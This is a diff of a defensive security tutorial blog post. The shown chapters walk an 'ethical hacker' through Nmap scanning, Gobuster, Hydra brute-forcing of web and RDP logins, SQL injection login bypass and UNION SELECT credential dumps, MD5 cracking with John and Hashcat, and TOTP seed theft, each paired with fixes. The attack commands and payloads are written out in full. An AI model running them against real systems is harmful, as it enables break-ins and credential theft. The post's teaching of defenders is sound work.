@@ -1,469 +1,736 @@
 ---
 title: "The Defender's Handbook — How Hackers Really Break In, and How Developers Stop Them"
-description: "A defensive-education tour through the actual attacker playbook: recon, hidden-page brute-forcing, Hydra logins, SQL injection, hash cracking, 2FA seed theft, reverse shells, browser-saved-password extraction, MITM/SSL-stripping, evil-twin Wi-Fi. Every attack is walked through with the real tools (Nmap, Gobuster, Hydra, Burp, sqlmap, John, Hashcat, msfvenom, Metasploit, Wireshark) — and translated into the concrete fix that shuts that door before it opens. Ends with a 3-tier hardening checklist."
+description: "A defensive-education tour through the actual attacker playbook: recon (Nmap), hidden-page brute-forcing (Gobuster + SecLists), Hydra logins (web + RDP), SQL injection (Burp + sqlmap, login bypass + UNION SELECT exfil), hash cracking (John + Hashcat, MD5/SHA-1 vs salted Argon2), TOTP seed theft + SIM-swap + AitM proxies, reverse shells (msfvenom + Meterpreter), browser-saved-password + Mimikatz dumps, MITM/SSL-stripping/Evil-Twin/ARP-poison/DNS-hijack/DDoS. Every attack walked through with install commands and the concrete defender's fix per layer. Capstone full-chain anatomy, OWASP Top 10 mapping, 3-tier hardening checklist, first-response playbook, 30/60/90 day action plan, secure-coding patterns, and a notable-breach appendix."
 image: https://14j7oh8kso.ufs.sh/f/HLxTbDBCDLwfH5kIuQBCDLwfiQb7ypA8NqdmaR9OJs6ego2E
 category: tutorial
 createdAt: 2026-06-04
-updatedAt: 2026-06-04
+updatedAt: 2026-06-05
 ---
 
-# The Defender's Handbook — How Hackers Really Break In, and How Developers Stop Them
+# The Defender's Handbook
+
+### A Developer's Security Field Guide
 
 **Last updated: June 2026 · By [JB (Muke Johnbaptist)](/) — same defensive-engineering frame I apply across [Shoppleet](https://shoppleet.com), [DGateway](https://dgateway.desispay.com) and every client API I ship.**
 
-> **Defensive education only.** Every technique below is shown so you can defend against it. Running these tools against systems you don't own or have written permission to test is a crime in most countries. Practice only on your own lab or deliberately vulnerable training apps.
+_How attackers really break into web apps, networks, and machines — and exactly how to stop them. Built from real attack walkthroughs and documented, published breaches. Every chapter follows an attacker through a complete intrusion — with the exact tools, how to install them, and the commands they run — then hands the page back to you with the concrete fixes that would have shut the door before it ever opened._
 
-After getting hacked, most people want a checklist. But you can't defend a door you don't know exists. So this guide does something different: it walks through the actual attacker playbook — step by step, with the real tools — and then translates each move into the concrete fix that shuts the door before it opens.
-
-The cast is simple. **Sally** is a developer who built something real and shipped it fast. **Kim** is an ethical hacker who probes Sally's systems the way a criminal would, then reports the holes. Each section follows the same rhythm: **the attack**, **why it works**, and **the defense**.
-
-## The shape of nearly every intrusion
-
-Despite endless variety in tools, almost every attack follows the same arc:
-
-**Recon** (find targets) → **Scan** (map open doors) → **Exploit** (break in) → **Access** (grab data or a shell) → **Persist** (stay and expand).
-
-Defense layers on top of that arc: make recon unrewarding, scanning unrevealing, exploitation impossible, access useless, and persistence detectable. No single control saves you — but together they make Kim move on to an easier target.
+> **Defensive education only.** Every technique here is shown so you can defend against it. Running these tools against systems you do not own or have explicit written permission to test is a crime in most countries. Practice only on your own lab, deliberately vulnerable training apps, or systems you are contracted in writing to assess.
 
 ---
 
-## 1. Reconnaissance & Network Scanning
+## Foreword — why think like an attacker?
 
-Before anyone touches your login form, they build a map. Which machines are alive? Which ports are open? What software answers?
+You cannot defend a door you do not know exists. Most breaches do not come from genius zero-days — they come from ordinary, well-understood mistakes: a forgotten admin page, an unsanitized input box, a weak password, a user who clicked the wrong attachment.
 
-### The attack
+This handbook walks through the standard attacker playbook the way it actually unfolds, step by step, and then translates each move into a defensive action you can implement this week. The recurring cast is simple: **Sally** is a developer or small-business owner who built something real and shipped it quickly. **Kim** is an ethical hacker — a penetration tester — who probes Sally's systems the same way a criminal would, but reports the holes instead of exploiting them.
 
-Kim starts with just a domain. A DNS lookup turns it into an IP:
+Every chapter is built from the same parts:
+
+- **The Tools & How to Install Them** — assume nothing is installed.
+- **The Attack** — the real commands, explained line by line.
+- **Why It Works** — the underlying concept, in plain language.
+- **Real-World Case Studies** — documented breaches where this exact technique caused real damage.
+- **The Defense** — specific, prioritized fixes.
+
+### The shape of nearly every intrusion
+
+Almost every attack follows the same arc — a "kill chain":
+
+**Recon** (find targets) → **Scan** (map open doors) → **Exploit** (break in) → **Access** (grab data/shell) → **Persist** (stay & expand)
+
+Defense is layered on top: you make recon less fruitful, scanning less revealing, exploitation impossible, access useless, and persistence detectable. No single control saves you — but together they make Kim move on to an easier target. This is **defense in depth**.
+
+### Five myths this handbook dismantles
+
+1. **"We're too small to be a target."** Attacks are automated and indiscriminate. Exposed services are probed within minutes.
+2. **"It's not linked, so nobody will find it."** Obscurity is not security.
+3. **"We hash passwords, so we're fine."** Fast, unsalted hashing is barely better than plaintext once leaked.
+4. **"We have 2FA, so accounts are safe."** Its secret, its channel, and the human can each be attacked.
+5. **"A firewall keeps attackers out."** Reverse shells call outward; phishing invites the attacker in.
+
+---
+
+## Before you begin — the lab, Kali Linux & ground rules
+
+To follow these attacks hands-on — the only real way to internalize the defenses — you need a safe, isolated practice environment.
+
+**What is Kali Linux?** A Debian-based distribution purpose-built for penetration testing, bundling hundreds of tools. You don't _have_ to use it — every chapter shows how to install each tool individually — but it's the standard environment.
+
+**Build a safe lab:**
+
+- **Virtual machines (recommended):** VirtualBox or VMware, running Kali and a vulnerable target on an isolated host-only network.
+- **WSL on Windows:** Kali via the Windows Subsystem for Linux for quick CLI practice.
+- **A throwaway cloud VPS:** powerful, but be disciplined about scope. (See the [VPS hardening guide](/blog/secure-vps-and-install-dokploy) if you want to lock down the box too.)
+
+**Safe, legal practice targets:** OWASP Juice Shop and DVWA (web), Metasploitable (network/host), and ranges like TryHackMe and Hack The Box.
 
 ```bash
+# Always update your package list first
+sudo apt update && sudo apt upgrade -y
+# On Kali, most tools are already present. Verify any tool:
+nmap --version
+```
+
+> **The single rule that keeps this legal:** authorization, in writing, before you touch a target. No exceptions.
+
+Throughout: `$` means a normal user shell; `#` or `sudo` means administrator rights. Lines starting with `#` in code blocks are comments — you don't type those.
+
+---
+
+## Chapter 1 — Reconnaissance & Network Scanning
+
+Before an attacker touches your login form, they build a map. Recon splits into **passive** (public info — WHOIS, DNS, search engines) and **active** (directly probing the target, which can be detected).
+
+### The tool: Nmap, and how to install it
+
+Nmap discovers live hosts, finds open ports, identifies services and versions, and can guess operating systems.
+
+```bash
+# On Kali, pre-installed. Verify:
+nmap --version
+# Debian / Ubuntu / WSL:
+sudo apt update && sudo apt install nmap -y
+# macOS: brew install nmap   |   Windows: installer from nmap.org
+```
+
+### The Attack — from a domain name to a live target
+
+```bash
+# Resolve the domain
 ping sallystartup.com
-# PING sallystartup.com (192.168.1.20): 56 data bytes
-# nslookup or dig work too
-```
+nslookup sallystartup.com
+dig +short sallystartup.com
 
-Then Nmap reveals the open "doors" and what runs behind them:
-
-```bash
+# Service & version scan
 nmap -sV 192.168.1.20
-# 80/tcp open  http  Apache httpd
-# -sV detects the service AND its version on each open port
+#   80/tcp open  http  Apache httpd 2.4.41
+# -sV probes each open port to detect the service AND its exact version
 ```
 
-On an internal network, he discovers the range with `ip a`, then sweeps for live hosts:
+That version number tells Kim precisely which published vulnerabilities (CVEs) might apply.
+
+**Scan types worth knowing:** `-sS` (SYN/stealth), `-sT` (full connect), `-sU` (UDP), `-sV` (version), `-O` (OS), `-A` (aggressive), `-p-` (all 65,535 ports), `-sn` (host discovery only). The **NSE** scripting engine (`--script vuln`) turns Nmap into a lightweight vulnerability checker.
 
 ```bash
+# Host discovery sweep across a subnet
 sudo nmap -sn 192.168.122.0/24 -n -oA tnet
-# -sn = no port scan (just "who's alive"), -n = no DNS, -oA = save all formats
+# -sn = host discovery only | -n = skip DNS | -oA saves all output formats
 ```
 
-### Why it works — the ARP-vs-ICMP trap
+### Why It Works — the ARP-vs-ICMP trap
 
-Here's a subtlety even defenders miss. People assume "host discovery" means _pinging_ (ICMP). But on a local subnet, Nmap quietly uses **ARP** (which maps IPs to hardware MAC addresses) instead.
+On a **local subnet**, Nmap quietly uses **ARP** (which maps IP to hardware MAC address) instead of ICMP ping. Machines almost always answer ARP because the network can't function otherwise — even when a firewall drops every ICMP and TCP probe.
 
-The consequence: **a host that doesn't reply to a ping is not necessarily offline.** On the same subnet, ARP almost always answers even if the firewall drops every ICMP and TCP probe. Across a router, ARP stops working and Nmap falls back to ICMP/TCP — and _now_ firewall config matters. A hardened machine can look "alive" locally yet "dead" from the internet. That's not the firewall being inconsistent; it's the scanner switching strategy.
+> **The lesson:** a host that doesn't reply to ping is **not** necessarily offline. On the same subnet, ARP almost always answers. The moment Kim scans _across a router_, ARP no longer works, Nmap falls back to ICMP/TCP, and _now_ the firewall decides whether the host looks alive. A hardened machine can look "alive" locally yet "dead" from the internet.
 
-### The defense
+### The Defense
 
-- **Expose the minimum.** Every open port is a door. Close everything you aren't using.
-- **Segment the network** (separate VLANs for servers, workstations, printers, IoT) to shrink the blast radius.
-- **Don't leak versions.** Banner-grabbing feeds attackers straight to known CVEs — suppress or genericize version headers.
-- **Monitor for scans** with an IDS/IPS (Suricata, Zeek) and rate-limit at the firewall.
-- **Patch the services that do answer** — recon is only useful if what it finds is exploitable.
+- **Expose the minimum.** Every open port is a door. Run your own external Nmap scan to see what the world sees.
+- **Segment the network** into VLANs to shrink the blast radius.
+- **Don't leak versions** — suppress server version banners (`ServerTokens Prod` / `server_tokens off`).
+- **Patch the services that do answer.**
+- **Monitor for scans** with an IDS/IPS and firewall rate-limiting. (The [Sentinel v2 migration guide](/blog/sentinel-pulse-migration-guide) wires WAF + auto-ban into Go APIs.)
+- **Default-deny firewall posture.**
 
-> **Case study — the seven silent hosts.** In one test, only 3 of 7 known hosts answered a ping sweep across a router. The other 4 were alive, running critical services, configured to drop ICMP. Dropping ICMP is fine hygiene — but it isn't a security control on its own, and "it didn't respond to ping" is never proof of safety.
+**Real-world case study — reconnaissance precedes the breach.** Security vendors repeatedly document that internet-facing services are scanned within _minutes_ of coming online; in one experiment, exposed RDP machines were brute-forced within ~90 seconds. **Lesson:** assume everything you expose is being scanned right now, automatically. There is no "too small to notice."
 
 ---
 
-## 2. Hidden Pages & Directory Brute-Forcing
+## Chapter 2 — Hidden Pages & Directory Brute-Forcing
 
-"Nobody will find it" is not a security strategy. Sally built an admin panel and just didn't link to it. Kim found it in minutes.
+"Nobody will find it" is not a security strategy. Sally built an admin panel and simply didn't link to it. Kim found it in minutes — because the absence of a link is not the absence of a page.
 
-### The attack
+### The tools — Gobuster & SecLists
 
-The admin panel exists on the server even though nothing links to it. **Gobuster** throws thousands of common path names at the server and watches which respond:
+**Gobuster** brute-forces directories/files from a wordlist. **SecLists** is a huge curated collection of wordlists (paths, usernames, passwords) harvested from real tests and breaches.
+
+```bash
+# Often preinstalled on Kali. Otherwise:
+sudo apt update
+sudo apt install gobuster seclists -y
+ls /usr/share/seclists/Discovery/Web-Content/
+# Or clone SecLists:
+git clone https://github.com/danielmiessler/SecLists.git
+```
+
+### The Attack
 
 ```bash
 gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://sallystartup.com
-# /.htaccess      (Status: 403)
-# /server-status  (Status: 403)
-# /admin.php      (Status: 200)   <-- accessible!
+#   /admin.php   (Status: 200)   <-- accessible!
+# dir = directory mode | -w = wordlist | -u = target URL
 ```
 
-The wordlist comes from **SecLists**, a curated collection of common directory names, usernames, passwords, and payloads gathered from real breaches. A `200` means "here it is"; a `403` means "it's here but you're blocked" — both confirm the path exists.
+Gobuster watches the HTTP status code: **200** (exists, accessible), **301/302** (exists, redirects), **403** (exists but blocked — still confirms existence), **404** (nothing there).
 
-### Why it works
+### Why It Works
 
-A web server returns whatever resource it has for a path, regardless of whether anything links to it. "Security through obscurity" collapses against a tool that tries every common name faster than any human could.
+A web server returns whatever resource it has for a path, regardless of whether anything links to it. "Security through obscurity" collapses against a tool that tries every common name faster than any human.
 
-### The defense
+### The Defense
 
-- **Authenticate admin areas properly** — a real server-side session, not a secret URL. Treat the path as public knowledge.
-- **Rate-limit and lock out** — turn a 2-minute scan into an impractical one and generate alerts.
-- **IP allow-list or VPN-gate** admin endpoints so they return nothing useful to the public internet.
-- **Lock down dotfiles and backups** (`.htaccess`, `.git`, `config.bak`, old archives) at the web-server layer.
-- **Add a WAF** to recognize and throttle brute-forcing patterns.
+- **Authenticate admin areas properly** — require a real server-side session, not a secret URL.
+- **Rate-limit and lock out** to turn a 2-minute scan into an impractical one.
+- **Restrict sensitive endpoints by network** (VPN or IP allow-list).
+- **Lock down dotfiles, backups & source control** (`.htaccess`, `.git`, `config.bak`, `database.sql`).
+- **Add a WAF**; **disable directory listing.**
 
-> **Case study — the unlinked admin panel.** Sally assumed an unlinked `admin.php` was invisible. Discovering it, then brute-forcing its login (next section), ended with a live customer database exposed. The root cause wasn't the hidden page — it was that being hidden _was_ the only protection, behind a weak password.
+**Real-world case study — exposed `.git` directories & admin panels.** Two patterns dominate reports: deployed sites accidentally serving their `/.git/` folder (handing over source code and hard-coded credentials), and discoverable admin/config/backup files left in the web root. **Lesson:** nothing in your web root is private just because you didn't link it.
 
 ---
 
-## 3. Brute-Forcing Logins with Hydra
+## Chapter 3 — Brute-Forcing Logins with Hydra
 
-Once Kim finds a login — a web panel, SSH, an exposed RDP port — he automates with **Hydra**, a fast login cracker that tries many username/password pairs until one works.
+Once Kim finds a login, he automates with Hydra, trying thousands of combinations until one works.
 
-### The attack — web form
+**Background:** _Brute force_ tries every combination; _dictionary attacks_ try a curated list of likely passwords; _credential stuffing_ reuses pairs leaked from other breaches (betting on password reuse).
 
-Hydra needs the form's page, field names, and the failure message (so it knows wrong from right):
+### The tool — Hydra
+
+```bash
+# Preinstalled on Kali. Otherwise:
+sudo apt update && sudo apt install hydra -y
+# macOS: brew install hydra
+```
+
+Key flags: lowercase `-l`/`-p` for a single username/password; uppercase `-L`/`-P` for _lists_.
+
+### The Attack, part 1 — a web form
 
 ```bash
 hydra -L users.txt -P passwords.txt sallystartup.com \
   http-post-form "/admin.php:username=^USER^&password=^PASS^:Incorrect username or password"
-# [80][http-post-form] login: administrator   password: iloveyou
+#   [80][http-post-form] login: administrator   password: iloveyou
+# ^USER^/^PASS^ are filled from the lists; the trailing string is the failure message
 ```
 
-### Same tool, different service — RDP
-
-On a coffee-shop network, Kim scans for the RDP port and points Hydra at it (he needs only the victim's IP):
+### The Attack, part 2 — Remote Desktop (RDP)
 
 ```bash
-nmap -p 3389 192.168.1.0/24            # find machines with RDP open
+nmap -p 3389 192.168.1.0/24            # which machines have RDP open?
 hydra -t 4 -V -f -L users.txt -P rockyou-05.txt rdp://192.168.1.40
-# [3389][rdp] login: Sally  password: 123456
+#   [3389][rdp] host: 192.168.1.40  login: Sally  password: 123456
+# -t 4 = 4 parallel attempts | -V = show each try | -f = stop on first hit
 ```
 
-An RDP client like `xfreerdp` then gives full desktop access.
+### The Attack, part 3 — username enumeration
 
-### A related trick — username enumeration
+If a login returns _different_ messages for invalid usernames vs. wrong passwords, Kim can confirm which usernames exist before cracking passwords.
 
-If a site returns _different_ messages ("username not found" vs. "wrong password"), Kim can confirm which usernames are valid before cracking passwords, narrowing his attack dramatically.
+### Why It Works
 
-### Why it works
+Three conditions: (1) unlimited attempts, (2) weak/reused passwords, (3) the app reveals valid usernames. Remove any one and it gets much harder. RDP is uniquely dangerous because it's often exposed directly to the internet with no lockout and no second factor.
 
-Three conditions make brute force succeed: (1) unlimited attempts allowed, (2) weak or reused passwords, (3) the app reveals whether a username is valid. Remove any one and it gets much harder; remove all three and it fails.
+### The Defense
 
-### The defense
+- **Account lockout & rate limiting.**
+- **Enforce strong passwords** (block known-breached ones).
+- **Add MFA.**
+- **Don't reveal valid usernames** — one generic failure message.
+- **Never expose RDP/SSH directly** — VPN-gate them; for SSH use keys and disable password login. (See the [SSH key security guide](/blog/ssh-key-security-guide) for the full playbook.)
+- **Add CAPTCHA after failures**; **monitor auth logs** (Windows RDP: Event ID 4625 for failures, 1149 for connections).
 
-- **Account lockout and rate limiting** — Hydra's speed is its weapon; take it away.
-- **Enforce strong passwords** and block known-breached ones (check against Have I Been Pwned).
-- **Multi-factor authentication** — a cracked password fails without the second factor.
-- **Generic error messages** — never confirm an account exists.
-- **Keep RDP/SSH off the public internet** (VPN-gate them); use SSH keys, disable password login. (See the [VPS hardening guide](/blog/secure-vps-and-install-dokploy) for the one-script setup.)
-- **CAPTCHA after a few failures** stops automated tools while barely affecting humans.
-- **Monitor auth logs** — a flood of failed logins is the clearest sign of an attack in progress.
+**Real-world case study — RDP brute force as the #1 ransomware entry point.** A large majority of cloud systems leave RDP exposed. Families including **CrySiS/Dharma**, **SamSam** (which hit a U.S. healthcare company in 2018), and **CryptON** have spread almost exclusively via RDP brute force. The FBI's IC3 issued public advisories naming RDP as a top vector, citing weak passwords, open port 3389, and unlimited login attempts. **Lesson:** never put RDP directly on the internet — VPN-gate it, require MFA, enforce lockout, monitor logons.
 
-> **Case study — "iloveyou" and "123456".** Both the web-panel and RDP breaches came down to a guessable password and a service that accepted unlimited tries. No exotic exploit. The cheapest high-impact fix in this whole guide is lockout + a banned-weak-password list.
+**Real-world case study — credential stuffing at scale.** Billions of leaked username/password pairs circulate on dark-web markets; automated tools replay them against unrelated sites. **Lesson:** enforce MFA (which defeats stuffing even with a valid password), check passwords against breach corpora, and never reuse passwords.
 
 ---
 
-## 4. SQL Injection — The Front Door Left Open
+## Chapter 4 — SQL Injection: The Front Door Left Open
 
-SQL injection happens whenever user input is glued directly into a database query. It's decades old, still everywhere, and entirely preventable.
+SQL injection happens whenever user input is glued directly into a database query. It's decades old and still in the OWASP Top 10.
 
-### The attack, part 1 — bypassing login
+### The tools — Burp Suite & sqlmap
 
-A naive backend builds a query by concatenation:
+**Burp Suite** is a proxy that intercepts, inspects, modifies, and replays HTTP(S) requests. **sqlmap** automates finding and exploiting SQLi.
+
+```bash
+# Both ship with Kali. Launch Burp: burpsuite
+# Otherwise download Burp Community Edition from portswigger.net
+sudo apt update && sudo apt install sqlmap -y
+# or: git clone https://github.com/sqlmapproject/sqlmap.git
+```
+
+### The Attack, part 1 — bypassing a login
+
+A naive backend builds a query by string concatenation:
 
 ```sql
 SELECT * FROM users WHERE username = 'sally_admin' AND password = 'dummy';
 ```
 
-Kim doesn't guess the password — he rewrites the query. Entered in the username field:
+Kim enters a crafted username that closes the string early and comments out the rest (`--` or `#` begins a SQL comment):
 
 ```
 sally_admin'--
+-- or the classic always-true variant:
 aaa' OR 1=1--
 ```
 
-The `--` (or `#` in MySQL) comments out the rest, including the password check. The query becomes `... WHERE username = 'aaa' OR 1=1--'` — and `1=1` is always true, so login succeeds, usually as the **first user in the table** (often the admin).
+The query becomes `... WHERE username = 'aaa' OR 1=1--' AND password = ...`. `1=1` is always true and the password check is commented out. Login succeeds, usually as the first user in the table — often the admin.
 
-### The attack, part 2 — stealing the whole database with UNION SELECT
+### The Attack, part 2 — stealing the database with UNION SELECT
 
-A search box is just as dangerous. Using **Burp Suite** (a proxy that intercepts and replays requests), Kim appends a single quote (`baker'`) and the server throws a raw SQL error — confirming the input reaches the database and leaking the query structure. He then merges a second query with **UNION SELECT**. Both queries must return the same number of columns, which he finds by trial and error:
+Appending a single quote to a search box (`baker'`) throws a raw SQL error — confirming the input reaches the database unsanitized. A **UNION SELECT** attack merges a second query (from the `users` table) into the results. Both queries must return the same number of columns:
 
-```
-baker') UNION SELECT 1 FROM users--                    -> 500 error
-baker') UNION SELECT 1,2,3,4,5 FROM users--            -> 500 error
-baker') UNION SELECT 1,2,3,4,5,6,7,8,9 FROM users--    -> 200 OK
+```sql
+baker') UNION SELECT 1 FROM users--                  -- 500 error
+baker') UNION SELECT 1,2,3,4,5,6,7,8,9 FROM users--  -- 200 OK (9 columns match)
 baker') UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--
+-- returns every user's id, email, and password hash
 ```
 
-The response returns every user's id, email, and password hash — with no login and no cracking. One crafted request to an unprotected search box emptied the user table.
+**Other flavors:** _error-based_ (relies on leaked errors), _blind_ (infers from true/false behavior), _time-based blind_ (infers from response delay, e.g. `SLEEP(5)`). sqlmap automates all of these.
 
-### Why it works
+### Why It Works
 
-The database can't tell malicious input from legitimate data because the app **mixed code and data together** as one string. The moment input can change a query's _structure_ rather than just its _values_, injection is possible.
+The application mixed code and data together as one string. The instant user input can change the _structure_ of a query rather than just its _values_, injection is possible.
 
-### The defense
+### The Defense
 
-- **Use parameterized queries / prepared statements.** This is the real fix. The structure is fixed in advance; input is bound separately as a value that can never become code. `WHERE username = ?` makes `' OR 1=1--` a meaningless username.
-- **Use an ORM** that parameterizes by default — and verify nobody bypasses it with raw queries.
-- **Validate and sanitize input** as defense in depth (never the only control).
-- **Least privilege for the DB account** — a successful injection then reaches far less.
-- **Never show raw SQL errors** to users; log them server-side.
-- **Don't leak username validity;** add a WAF as a backstop. (See [Sentinel v2 + Pulse v1 migration](/blog/sentinel-pulse-migration-guide) for the Go-side WAF + auto-ban plumbing.)
+- **Use parameterized queries / prepared statements** — the real fix. The query structure is fixed; input is bound separately as data that can never become code.
+- **Use an ORM/query builder** that parameterizes by default.
+- **Validate and sanitize input** as defense in depth.
+- **Apply least privilege to the DB account.**
+- **Never show raw SQL errors to users.**
+- **Don't leak username validity**; **deploy a WAF**; **patch promptly.**
 
-> **The one-line takeaway:** if you concatenate user input into a SQL string, you're vulnerable. If you use parameterized queries everywhere, this entire section's attacks stop working.
+> **The one-line takeaway:** if you concatenate user input into a SQL string, you are vulnerable. If you use parameterized queries everywhere, this entire chapter's attacks stop working.
+
+**Real-world case study — the billion-record breaches.** SQLi has caused some of history's largest breaches: **Heartland (2008)**, ~130M cards, costs over $200M; **TalkTalk (2015)**, an unpatched SQLi exposing ~157K customers; **Yahoo! Voices (2012)**, ~450K unencrypted credentials via union-based SQLi; **Equifax (2017)**, ~143M people. Investigators cited the same failures: input concatenated into queries, missing validation, no WAF, verbose errors, unpatched systems. **Lesson:** these were the exact textbook flaw in this chapter, at scale.
+
+**Real-world case study — SQLi reaches everywhere.** A 2019 SQLi flaw in **Fortnite** could have exposed player accounts; popular **WordPress/WooCommerce plugins** have shipped SQLi flaws exposing millions of sites at once; attackers have hit **universities** to steal tens of thousands of records. **Lesson:** any app with a database and user input is a target. Keep dependencies patched — a flaw in a plugin is your flaw too.
 
 ---
 
-## 5. Password Hashing & Cracking
+## Chapter 5 — Password Hashing & Cracking
 
-Sally did the "right" thing — she stored hashes, not plaintext. But hashing isn't a magic word; the _algorithm_ and whether you _salt_ decide whether those hashes survive an attacker.
+Sally stored hashes, not plaintext. But the _algorithm_ and whether you _salt_ decide whether those hashes survive contact with an attacker.
 
-### What a hash is
+**What a hash is:** a one-way function turning any input into a fixed-length string that can't be reversed. You can't reverse a hash — but you can _guess and compare_: hash a candidate, check if it matches. Do that billions of times per second and weak passwords fall fast.
 
-A one-way function: it turns any input into a fixed-length string and can't be reversed. So why are stolen hashes dangerous? Because you can't _reverse_ a hash, but you can _guess and compare_.
+### The tools — John the Ripper & Hashcat
 
-### The attack — dictionary cracking
-
-With the email + hash pairs from the UNION SELECT, Kim identifies them as **MD5** (32 hex characters) and feeds them to **John the Ripper** with a wordlist:
+**John** is a flexible offline hash cracker; **Hashcat** is the fastest, GPU-accelerated.
 
 ```bash
+# Both preinstalled on Kali. Verify John: john --help
+sudo apt update && sudo apt install john hashcat -y
+# The rockyou wordlist on Kali (decompress once):
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+```
+
+### The Attack
+
+```bash
+# A 32-char hex string = raw MD5
 echo "jane:5f4dcc3b5aa765d61d8327deb882cf99" >> hashes.txt
-john --format=raw-md5 --wordlist=best15.txt hashes.txt
-# iloveyou   (jane)
-# letmein    (joshua)
+john --format=raw-md5 --wordlist=rockyou.txt hashes.txt
+#   iloveyou  (jane)
+
+# Same job in Hashcat (mode 0 = MD5, -a 0 = dictionary)
+hashcat -m 0 -a 0 hashes.txt rockyou.txt
 ```
 
-**Hashcat** does the same job, GPU-accelerated, often against `rockyou.txt` (~14M leaked passwords). Against fast hashes like MD5, weak passwords fall in seconds.
+A **rainbow table** attack goes further, using precomputed hash→password tables to reverse unsalted hashes almost instantly.
 
-### Why it works
+### Why It Works
 
-Two failures compound. **MD5 is fast** (billions of guesses/second on a GPU), so brute force is cheap. And **without a salt**, identical passwords produce identical hashes — enabling precomputed rainbow-table lookups and letting one cracked hash expose everyone sharing that password.
+Two failures compound. **MD5 and SHA-1 are fast** — a GPU computes tens of millions to billions per second — so brute force is cheap. **Without a salt**, identical passwords produce identical hashes, enabling rainbow tables and meaning one cracked hash reveals everyone who shares that password.
 
-### The defense
+### The Defense
 
-- **Never use MD5 or SHA-1 for passwords** — far too fast, broken for this purpose.
-- **Use a slow, purpose-built algorithm:** bcrypt, scrypt, or **Argon2** (Argon2id is the modern first choice). They turn a seconds-long crack into a years-long one.
-- **Unique salt per password** — defeats rainbow tables and forces the attacker to crack every hash from scratch.
-- **Tune the work factor** as high as your servers tolerate; revisit as hardware improves.
-- **Add a pepper** (a secret stored outside the database) so a database-only breach yields nothing crackable.
+- **Never use MD5 or SHA-1 for passwords.**
+- **Use a slow, purpose-built algorithm:** bcrypt, scrypt, or Argon2 (Argon2id is the modern first choice).
+- **Use a unique salt per password** (modern libraries do this automatically).
+- **Tune the work factor** as high as your servers tolerate.
+- **Add a pepper** — a secret stored outside the database.
+- **Cap login attempts**; **combine with MFA.**
 
-> **Case study — "hashed" is not "safe".** Sally stored unsalted MD5; "admin123" and "iloveyou" fell in seconds against a tiny wordlist. Salted Argon2 would have made the same leaked database near-useless. Same breach, completely different outcome.
+**Real-world case study — the LinkedIn breach (2012/2016).** In 2012, ~6.5M password hashes leaked; the fatal detail was **unsalted SHA-1**. Because SHA-1 is extremely fast and no salt was used, attackers cracked enormous numbers quickly. In 2016, over 117M pairs surfaced; just 50 trivially-guessed passwords accounted for more than 2.2M accounts. **Lesson:** abandon fast unsalted hashing for a slow, salted algorithm — you need both slowness _and_ uniqueness.
 
 ---
 
-## 6. Defeating Two-Factor Authentication
+## Chapter 6 — Defeating Two-Factor Authentication
 
-2FA is genuinely powerful — a stolen password alone won't get in. But it protects you only if its _secret_ is protected. Sally's mistake wasn't using 2FA; it was storing its secret where an attacker could reach it.
+2FA protects you only if its secret (and the channel it travels on) is protected. Sally's mistake wasn't using 2FA; it was storing its secret where an attacker could reach it.
 
-### How TOTP works
+**How TOTP works:** the common 6-digit code (Google Authenticator) is generated by **TOTP** (RFC 6238), combining a **shared secret key** (created at setup, stored on server and phone) with the **current time**. The algorithm and clock are public — so _everything_ rests on the secrecy of the seed.
 
-The six-digit codes from apps like Google Authenticator come from **TOTP** (Time-based One-Time Password, RFC 6238). It combines a **shared secret key** (created at setup, stored on both server and phone) with the **current time**. Same public algorithm + same secret + same moment = same code on both sides. That's the magic and the weakness.
+### The Attack, part 1 — steal the seed, clone the token
 
-### The attack — steal the seed, clone the token
+Kim already has database access from his SQL injection. If a user enabled 2FA, the TOTP secret is probably in the `users` table:
 
-Kim already has database access from his SQL injection. He reasons the TOTP secret is probably in the `users` table and guesses the column name through the injection until one returns data:
-
-```
-... UNION SELECT id,email,password,totp_key,5,6,7,8,9 FROM users--    -> no such column
-... UNION SELECT id,email,password,totp_secret,5,6,7,8,9 FROM users-- -> 200 OK
-# jane:  JBSWY3DPEHPK3PXP   (base32 TOTP seed)
+```sql
+... UNION SELECT id,email,password,totp_secret,5,6,7,8,9 FROM users--
+--   jane:  JBSWY3DPEHPK3PXP   (base32 — the TOTP seed)
 ```
 
-He adds Jane's secret to his own authenticator app as a manual key. His phone now generates the exact same codes Jane's does, in sync. Combined with the cracked password, the second factor is gone — no reset, no access to Jane's phone, no alarms.
+He loads Jane's secret into his own authenticator app. His phone now generates the exact codes Jane's shows. Combined with the cracked password, the second factor is gone — and the login looks completely legitimate.
 
-### Why it works
+### The Attack, part 2 — when the seed is safe: SIM swapping & AitM proxies
 
-TOTP's security rests entirely on the secrecy of the seed. The algorithm and the clock are public. If the seed leaks, an attacker reproduces every future code forever. Storing it in plaintext next to passwords collapsed two factors back into one.
+- **SIM swapping:** if codes arrive by SMS, an attacker who convinces a carrier to move the victim's number to their SIM receives every code and reset link. This is why SMS is the weakest second factor.
+- **Real-time phishing proxies (Adversary-in-the-Middle):** tools like Evilginx sit between user and real site, capturing the password, the OTP, _and_ the resulting session cookie — bypassing 2FA entirely.
 
-### The defense
+### Why It Works
 
-- **Fix the SQL injection first** — if the database can't be read, the seed can't be stolen. (Upstream root cause.)
-- **Never store TOTP secrets in plaintext** — encrypt at rest with a key held outside the database, or use a vault (HashiCorp Vault, AWS Secrets Manager, cloud KMS).
+TOTP's security rests entirely on the seed; SMS 2FA's on the phone network; OTP 2FA's on the user not entering the code on a fake page. Sally collapsed two factors into one by storing the seed in plaintext in the same table the SQLi could read.
+
+### The Defense
+
+- **Fix the SQL injection first** — if the database can't be read, the seed can't be stolen.
+- **Never store TOTP secrets in plaintext** — encrypt at rest or use a secrets vault.
 - **Isolate secrets from ordinary app data.**
-- **Consider phishing-resistant factors** — hardware keys / passkeys (FIDO2/WebAuthn) don't rely on a shared seed in your database.
-- **Detect anomalies** — new device/location or impossible travel should trigger step-up verification even with a correct code.
+- **Prefer app-based TOTP or push over SMS.**
+- **Adopt phishing-resistant factors** — hardware keys / passkeys (FIDO2/WebAuthn) are bound to the real site's domain, defeating both seed theft and AitM. The strongest answer.
+- **Detect anomalies & bind sessions** (new device/location, impossible travel, token reuse → step-up verification).
 
-> **Security is only as strong as the weakest layer.** Sally hashed passwords _and_ used 2FA — strong on paper. One weak point (storing secrets reachably) undid both.
